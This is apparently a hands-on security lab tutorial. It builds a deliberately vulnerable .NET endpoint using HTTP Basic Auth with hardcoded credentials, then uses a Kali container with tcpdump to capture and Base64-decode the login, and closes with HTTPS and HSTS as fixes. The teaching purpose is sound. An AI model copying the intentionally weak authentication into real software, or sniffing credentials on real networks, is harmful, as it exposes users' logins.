# Hacking Basic Auth: A Hands-On .NET & Podman Lab

Authentication theory is dry; breaking it is unforgettable. In this hands-on lab, we will dismantle **HTTP Basic Authentication**—the oldest and most misunderstood mechanism on the web.

We won't use a pre-made vulnerable VM. Instead, we will build a modern **Micro-Range** using **Podman**, **.NET**, and a **Kali Linux sidecar**. This architecture allows you to safely simulate a "Man-in-the-Middle" (MitM) attack on your local machine using the shared network namespace of a Pod.

## The Architecture: The "Sidecar" Pattern

To simulate a compromised network without complex routing, we will place two containers inside a single **Podman Pod**.

- **The Target:** A .NET 8 Minimal API (Port 8080).
- **The Attacker:** A headless Kali Linux container.

Because they share the same Pod, they share the same **Network Namespace (`localhost`)**. This allows our Kali container to "sniff" traffic hitting the .NET app, effectively simulating a compromised router or switch in the data center.
***
### Phase 1: Build the Target(.NET)

First, we need a vulnerable application. We will create a C# Minimal API that manually parses the `Authorization` header. This forces us to understand exactly how the server reads our credentials.

#### 1. Create the Application Code (`Program.cs`)
Create `BasicAuth` folder.
Create `src` folder within `BasicAuth`. Save the following code into a file named `Program.cs` in `src`.
```csharp
using System.Text;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/secret", (HttpContext context) =>
{
    // 1. Intercept the Authorization Header
    string authHeader = context.Request.Headers["Authorization"];
    
    // 2. If missing, force the browser/client to prompt
    if (string.IsNullOrEmpty(authHeader) || !authHeader.StartsWith("Basic "))
    {
        context.Response.Headers["WWW-Authenticate"] = "Basic realm=\"Top Secret Area\"";
        return Results.Unauthorized();
    }

    try
    {
        // 3. The Vulnerability: Basic Auth is just Base64
        // Header Format: "Basic <Base64EncodedString>"
        var encodedValue = authHeader.Substring("Basic ".Length).Trim();
        var decodedBytes = Convert.FromBase64String(encodedValue);
        var credentials = Encoding.UTF8.GetString(decodedBytes).Split(':', 2);

        var username = credentials[0];
        var password = credentials[1];

        // 4. Weak Validation (Hardcoded)
        if (username == "admin" && password == "password123")
        {
            return Results.Ok(new { 
                status = "pwned", 
                flag = "flag{base64_is_security_theater}",
                details = "You successfully constructed a valid Basic Auth header."
            });
        }
    }
    catch
    {
        return Results.BadRequest("Invalid Header Format");
    }

    return Results.Unauthorized();
});

app.Run("http://0.0.0.0:8080");
```

#### 2. Create the Containerfile
Save this as `Containerfile` in `BasicAuth` folder.
```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
# Create project file on the fly to save setup time
RUN dotnet new web -n BasicAuth
COPY Program.cs /src/BasicAuth/Program.cs
WORKDIR /src/BasicAuth
RUN dotnet publish -c Release -o /app

FROM mcr.microsoft.com/dotnet/aspnet:8.0
WORKDIR /app
COPY --from=build /app .
ENTRYPOINT ["dotnet", "BasicAuth.dll"]
```
### Phase 2: Deploy the Infrastructure

We will use Podman to spin up the environment. Run these commands in your terminal from `BasicAuth` folder.

```bash
# 1. Build the Target Image
podman build -f Containerfile -t auth-basic-target .

# 2. Create the Shared Pod (Exposing Port 8080)
podman pod create --name auth-range -p 8080:8080

# 3. Launch the Target (Background)
podman run -d --pod auth-range --name target auth-basic-target

# 4. Launch the Attacker (Background)
# We use 'sleep infinity' to keep the container running without a GUI
podman run -d --pod auth-range --name attacker kalilinux/kali-rolling sleep infinity
```

### Phase 3: The Attack (Man-in-the-Middle)

Now for the fun part. You are going to act as the attacker sitting on the network, watching traffic flow to the server.

#### Step 1: Equip the Attacker

Remote into the Kali container and install `tcpdump`.

```bash
podman exec -it attacker /bin/bash

# Inside the container:
apt update && apt install -y tcpdump
```

#### Step 2: Start the Sniffer

We will listen on all interfaces (any) and print the output in ASCII (-A) so we can read the headers.

```bash
# Listen for traffic on port 8080
tcpdump -i any -A port 8080
```

#### Step 3: Trigger the Traffic (The Victim)

Open your Host Browser (Chrome, Firefox, etc.) and navigate to:
`http://localhost:8080/secret`

The browser will prompt you to log in. Enter:
- Username: admin
- Password: password123

#### Step 4: The Compromise
Look back at your Kali terminal. You will see a burst of text. Buried in the HTTP headers, you will find the "Authorization" line:

```http
GET /secret HTTP/1.1
Host: localhost:8080
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
User-Agent: Mozilla/5.0...
```

#### Step 5: Decode the loot
Copy that strange string (`YWRtaW4...`) and decode it right there in the terminal.

```bash
echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
# Output: admin:password123
```

```mermaid
sequenceDiagram
    participant Host as Host Browser (Us)
    participant Nic as Shared Network (eth0)
    participant Kali as Kali Sidecar (Attacker)
    participant App as .NET Target (App)

    Note over Host, App: The "Auth-Range" Pod

    Host->>Nic: POST /login (Authorization: Basic YWRtaW4uLi4=)
    
    par Packet Broadcast
        Nic->>App: Forward Request
        Nic-->>Kali: Passive Copy (tcpdump listening)
    end

    Note right of Kali: ATTACKER SEES THIS!
    Kali->>Kali: Decode Base64 -> "admin:password123"

    App-->>Host: 200 OK (Logged In)
```

### Conclusion
You have just demonstrated why HTTP Basic Authentication is dangerous over unencrypted connections. By simply listening to the network traffic, we were able to capture the credentials in cleartext (Base64 is encoding, not encryption!).

### The Fix:
1. **Enforce HTTPS**: Transport Layer Security (TLS) encrypts the entire HTTP payload. If we ran this same attack on an HTTPS connection, `tcpdump` would only show garbled binary data.
2. **Use HSTS**: Ensure browsers refuse to connect via insecure HTTP.

